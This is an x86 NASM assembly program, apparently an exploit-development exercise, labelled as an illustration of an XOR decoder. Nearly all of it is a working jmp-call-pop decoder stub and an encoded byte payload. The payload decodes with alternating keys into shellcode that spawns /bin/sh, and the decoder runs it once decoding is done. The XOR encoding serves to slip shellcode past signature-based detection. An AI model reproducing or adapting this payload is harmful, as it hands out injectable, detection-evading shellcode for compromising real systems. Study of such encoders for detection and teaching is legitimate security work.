;THIS PROGRAM ILLUSTRATES USE OF XOR DECODER

global _start

section .text

_start:

	jmp short call_shellcode	

decoder:
	pop edi
	xor ecx , ecx
	mov cl , slen		; Length of the shellcode for iteration
	
decode:
	mov ebx , ecx
	and ebx , 0x1
	cmp ebx , 0x1        	; Condition checks for odd no
	je Odd			
	
	xor byte [edi] , 0xC1	; XORs with (0xBB + 0x6)
	inc edi
	cmp byte [edi] , 0x22	; is it the last shellcode byte?
	je Egg			; then call shellcode
	inc ecx			; increment counter by 0x1
	jmp short decode

Odd:
	xor byte [edi] , 0xB0	; XORs with (0xAA + 0x6)
	inc edi
	cmp byte [edi] , 0x22	; is it the last shellcode byte?
	je Egg			; then call shellcode
	inc ecx			; increment counter by 0x1
	jmp short decode

call_shellcode:	
	
	call decoder
	Egg: db 0x81,0x01,0xe0,0xa9,0x9f,0xee,0xc3,0xa9,0xd8,0xee,0xd2,0xa8,0xde,0x48,0x53,0x91,0x39,0x23,0xe3,0x48,0x51,0x71,0xbb,0x0c,0x30,0x22 
	slen equ 0x1
